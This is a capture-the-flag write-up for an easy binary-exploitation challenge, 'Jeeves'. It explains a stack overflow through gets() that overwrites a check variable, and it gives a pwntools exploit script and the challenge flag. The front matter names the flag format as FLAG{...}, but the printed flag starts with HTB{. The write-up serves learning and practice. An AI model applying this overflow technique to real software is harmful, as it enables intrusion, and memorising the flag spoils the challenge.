---
title: "Jeeves"
ctf: "CTFs-Testing"
date: 2026-06-07
category: pwn
difficulty: easy
flag_format: "FLAG{...}"
---

# Jeeves

## Summary

Buffer overflow via `gets()` to overwrite a stack variable with a magic value (`0x1337bab3`), which triggers code that opens and prints `flag.txt`.

## Solution

The binary uses `gets()` to read into a 64-byte buffer (`rbp-0x40`). The magic variable is at `rbp-0x4`, initialized to `0xdeadc0d3`. After `gets()`, the program checks if the variable equals `0x1337bab3` and, if so, reads and prints `flag.txt`.

The payload: 60 bytes (`0x3c`) of padding + the magic value in little-endian.

```python
from pwn import *

context.binary = './challenge/jeeves'
context.log_level = 'info'

def exploit():
    payload = b'A' * 0x3c + p32(0x1337bab3)

    io = process('./challenge/jeeves')
    io.recvuntil(b'Hello, good sir!')
    io.sendline(payload)
    result = io.recvall(timeout=2)
    print(result.decode(errors='replace'))
    io.close()

if __name__ == '__main__':
    exploit()
```

## Flag

```
HTB{w3lc0me_t0_lAnd_0f_pwn_&_pa1n!}
```
